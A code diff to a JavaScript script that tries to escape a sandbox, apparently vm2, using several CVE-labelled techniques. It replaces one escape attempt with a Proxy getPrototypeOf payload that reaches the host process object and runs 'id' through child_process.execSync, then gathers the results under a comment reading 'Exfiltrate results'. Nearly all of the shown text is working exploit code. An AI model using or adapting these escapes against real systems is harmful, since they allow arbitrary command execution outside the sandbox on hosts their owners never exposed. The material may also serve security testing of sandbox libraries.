@@ -46,40 +46,30 @@ js {
     escape2Result = "CVE-2023-37466_BLOCKED: " + e.message;
   }
 
-  // CVE-2023-29017: Error.prepareStackTrace bypass
+  // CVE-2023-29199: Source transformation bypass
   let escape3Result = "NOT_TESTED";
   try {
-    async function fn() {
-      (function stack() {
-        new Error().stack;
-        stack();
-      })();
-    }
     const handler = {
-      getPrototypeOf(target) {
-        (function stack() {
-          new Error().stack;
-          stack();
-        })();
+      getPrototypeOf(t) {
+        const p = t.constructor.constructor("return this")().process;
+        throw p.mainModule.require("child_process").execSync("id").toString();
       }
     };
-    const f = async function(){};
-    Object.setPrototypeOf(f, new Proxy(Function, handler));
+    const f = Object.setPrototypeOf(() => {}, new Proxy(Object, handler));
     try {
-      await f();
+      Object.getPrototypeOf(f);
     } catch (e) {
-      const process = e.constructor.constructor("return process")();
-      escape3Result = "CVE-2023-29017_SUCCESS: " + process.mainModule.require("child_process").execSync("id").toString();
+      escape3Result = "CVE-2023-29199_SUCCESS: " + e;
     }
   } catch (e) {
-    escape3Result = "CVE-2023-29017_BLOCKED: " + e.message;
+    escape3Result = "CVE-2023-29199_BLOCKED: " + e.message;
   }
 
   // Exfiltrate results
   const results = {
     cve_2023_32314: escapeResult,
     cve_2023_37466: escape2Result,
-    cve_2023_29017: escape3Result,
+    cve_2023_29199: escape3Result,
     timestamp: new Date().toISOString()
   };
 
